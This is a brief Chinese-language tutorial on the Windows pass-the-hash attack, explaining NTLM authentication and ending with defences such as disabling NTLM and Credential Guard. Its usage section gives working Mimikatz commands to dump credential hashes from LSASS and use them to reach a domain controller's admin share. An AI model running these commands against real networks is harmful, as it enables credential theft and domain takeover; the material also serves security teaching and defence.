## 一、介绍

### 1、原理

```php
	哈希传递攻击的原理就是利用NTLM认证中的缺陷。在认证过程中，攻击者并不需要获取到用户的明文密码，只要获取到用户的HTLM HASH，就可以伪造用户发起一次完整的认证流程。如果此用户是域管理员，那么攻击者就可以伪造程域管理员从而控制域内的所有机器。
```

### 2、NTLM认证

```php
# 工作组
	1、用户向服务器发起NTLM认证请求，并且将自己的用户名发给服务器
	2、服务器发送一个16位的随机数给用户
	3、用户用密码哈希加密随机数，将加密后的数据返回给服务器
```

```php
# 域
	1、用户向服务器发起HTLM认证请求，并且将自己用户名发给服务器
	2、服务器发送一个16位的随机数给用户
	3、用户用密码哈希加密随机数，将加密后的数据返回给服务器
	4、服务器向域控发送验证请求包
	5、域控返回验证结果
```



## 二、用法

```php
# 场景
	攻击者获得了一个Windows的shell，并且成功提权到了管理员权限，但是不知道管理员的明文密码，无法直接登录。同时发现这台机器是在一个域内，需要想办法获取域控的权限。
```

### 1、Mimikatz之debug权限

```java
	> .\mimikatz.exe
	mimikatz# privilege::debug
```

### 2、抓取Lsass进程用户哈希

```java
	mimikatz# sekurlsa::logonPasswords
```

```
	dir \\[域控IP]\c$
	// 此时访问域控IP是会被拒绝的，因为权限不够
```

### 3、哈希传递

```
	mimikatz# sekurlsa::pth /user:[用户名] /domain:[用户所在域] /ntlm:[用户的ntlm hash]
```

### 4、攻击成功

```
	dir \\[域控IP]\c$
```



## 三、防御

### 1、禁止NTLM认证

```php
	这是最有效防止哈希传递攻击的方法，但Windows环境中，NTLM认证已经存在相当长的时间，直接禁止NTLM认证会破坏到当前的环境。
```

### 2、防止NTLM HASH被获取

```php
	NTLM认证缺陷属于逻辑问题，微软官方有推行了一系列补丁以及其他操作缓解哈希传递带来的危害，如：
	KB2871997
	Additional LSA Protection
	Credentials Guard
```

